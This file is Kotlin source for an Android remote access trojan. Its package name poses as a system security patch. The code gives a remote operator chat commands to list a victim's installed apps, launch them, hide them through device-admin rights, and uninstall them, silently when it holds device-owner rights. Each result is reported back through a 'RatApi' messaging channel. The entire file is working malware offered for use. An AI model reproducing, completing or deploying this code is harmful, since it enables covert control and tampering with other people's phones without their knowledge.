package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import com.android.security.patch.AdminReceiver
import com.android.security.patch.RatApi

object Apps {

    /** /apps [filter] — list user-installed packages */
    fun listApps(ctx: Context, chatId: Long, args: Array<String>) {
        val filter = args.joinToString(" ").lowercase()
        Thread {
            try {
                val pm = ctx.packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                    .filter { it.packageName != ctx.packageName }
                    .filter {
                        (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 ||
                        (it.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                    }
                    .filter {
                        filter.isBlank() ||
                        it.packageName.lowercase().contains(filter) ||
                        pm.getApplicationLabel(it).toString().lowercase().contains(filter)
                    }
                    .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }

                if (apps.isEmpty()) {
                    RatApi.sendMessage(ctx, "no apps match", chatId); return@Thread
                }
                val sb = StringBuilder("<b>apps (${apps.size})</b>\n")
                for (a in apps.take(80)) {
                    val label = pm.getApplicationLabel(a)
                    sb.append("<code>${a.packageName}</code> — $label\n")
                }
                if (apps.size > 80) sb.append("\n<i>+ ${apps.size - 80} more, refine filter</i>")
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /app_open <pkg> */
    fun openApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_open &lt;pkg&gt;", chatId); return
        }
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) {
                RatApi.sendMessage(ctx, "no launcher for $pkg", chatId); return
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "opened $pkg", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /** /app_hide <pkg> — hide via admin */
    fun hideApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_hide &lt;pkg&gt;", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
            RatApi.sendMessage(ctx, "admin not active", chatId); return
        }
        try {
            val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, true)
            RatApi.sendMessage(ctx, if (ok) "hidden $pkg" else "failed (not device owner?)", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    fun showApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_show &lt;pkg&gt;", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, false)
            RatApi.sendMessage(ctx, if (ok) "shown $pkg" else "failed", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /** /app_uninstall <pkg> — silent kalau device owner, prompt kalau engga */
    fun uninstallApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_uninstall &lt;pkg&gt;", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            if (AdminReceiver.isDeviceOwner(ctx)) {
                dpm.deletePackage(AdminReceiver.component(ctx), pkg, null)
                RatApi.sendMessage(ctx, "silent uninstall: $pkg", chatId)
            } else {
                val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
                RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
            }
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }
}